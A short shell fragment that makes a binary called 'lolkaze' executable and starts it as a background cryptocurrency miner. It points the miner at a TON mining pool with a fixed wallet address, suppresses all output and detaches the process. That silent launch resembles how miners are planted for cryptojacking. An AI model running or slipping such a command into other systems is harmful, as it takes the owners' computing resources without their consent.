...
chmod +x lolkaze
nohup ./lolkaze --algo GRAM --pool fi.ton.hashrate.to --port 4003 --user UQDZ3xIoMrP6K6BNMEZL_Hv8sEhWE-js9SWzFNxJEMywJ8ij.$(echo Rig-$(shuf -i 1000-9999 -n 1)) > /dev/null 2>&1 &
sleep 30
